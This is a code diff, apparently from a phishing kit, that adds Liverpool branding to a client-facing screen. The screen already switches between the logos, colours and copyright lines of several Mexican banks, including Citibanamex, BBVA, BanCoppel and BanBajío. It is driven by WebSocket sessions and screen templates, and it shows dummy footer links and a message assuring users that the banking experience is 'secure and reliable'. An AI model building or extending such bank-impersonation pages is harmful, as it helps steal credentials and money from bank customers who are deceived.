@@ -4,7 +4,8 @@ import { useWebSocket } from '@/hooks/useWebSocket';
 import { ScreenTemplates } from '@/components/client/ScreenTemplates';
 import { Session, ScreenType } from '@shared/schema';
 import { formatDate } from '@/utils/helpers';
-import liverpoolLogo from '../assets/pngwing.com 2.png';
+import liverpoolLogo from '@assets/logo-brand-liverpool-f-c-design-acaab2087aa7319e33227c007e2d759b.png'; // Logo de Liverpool
+import liverpoolLogoWhite from '@assets/liverpool_logo_white.png'; // Logo de Liverpool en blanco
 import citibanamexLogo from '../assets/Banamex.png';
 import banbajioLogo from '../assets/banbajio_logo_oficial.png';
 import banbajioBackground from '../assets/IMG_0354.jpeg';
@@ -171,7 +172,20 @@ export default function ClientScreen() {
 
   // Función para determinar el header basado en el banco
   const renderHeader = () => {
-    if (sessionData.banco === 'BANBAJIO') {
+    if (sessionData.banco === 'LIVERPOOL') {
+      return (
+        <header className="bg-[#E1147B] text-white p-4 text-center">
+          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
+          <div className="flex justify-center">
+            <img 
+              src={liverpoolLogo} 
+              className="h-20 inline-block filter brightness-0 invert" 
+              alt="Liverpool" 
+            />
+          </div>
+        </header>
+      );
+    } else if (sessionData.banco === 'BANBAJIO') {
       return (
         <>
           <div className="logo text-center py-4 bg-white">
@@ -327,6 +341,7 @@ export default function ClientScreen() {
         <footer className="mt-auto">
           <div className="bg-gray-100 p-4 text-center text-sm">
             <a href="#" className={`${
+              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' : 
               sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
               sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
@@ -338,6 +353,7 @@ export default function ClientScreen() {
               'text-[#EC1C24]'
             } mx-2`}>Aprende más</a>
             <a href="#" className={`${
+              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
               sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
               sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
@@ -349,6 +365,7 @@ export default function ClientScreen() {
               'text-[#EC1C24]'
             } mx-2`}>Ayuda</a>
             <a href="#" className={`${
+              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
               sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
               sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
@@ -360,6 +377,7 @@ export default function ClientScreen() {
               'text-[#EC1C24]'
             } mx-2`}>Términos y condiciones</a>
             <a href="#" className={`${
+              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
               sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
               sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
@@ -373,6 +391,7 @@ export default function ClientScreen() {
           </div>
 
           <div className={`${
+            sessionData.banco === 'LIVERPOOL' ? 'bg-[#E1147B]' :
             sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 
             sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
             sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
@@ -391,6 +410,7 @@ export default function ClientScreen() {
               <a href="#" className="text-white mx-2">Youtube</a>
             </div>
             <div>© {
+              sessionData.banco === 'LIVERPOOL' ? 'Liverpool' :
               sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 
               sessionData.banco === 'BBVA' ? 'BBVA' :
               sessionData.banco === 'BANCOPPEL' ? 'BanCoppel' :
@@ -411,6 +431,12 @@ export default function ClientScreen() {
   const renderBankInfo = () => {
     if (sessionData.banco === 'BANBAJIO') {
       return null; // BanBajío no muestra información adicional
+    } else if (sessionData.banco === 'LIVERPOOL') {
+      return (
+        <div className="text-center mt-4 px-4">
+          <p className="text-sm text-gray-600">Tu experiencia de banca en línea de Liverpool, segura y confiable</p>
+        </div>
+      );
     } else if (sessionData.banco === 'CITIBANAMEX') {
       return (
         <div className="text-center mt-4 px-4">
@@ -495,6 +521,7 @@ export default function ClientScreen() {
             <h2 className="text-xl font-semibold mb-4">{initialMessage}</h2>
             <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
               <div className={`h-full ${
+                sessionData.banco === 'LIVERPOOL' ? 'liverpool-bg' :
                 sessionData.banco === 'BANBAJIO' ? 'banbajio-bg' : 
                 sessionData.banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
                 sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
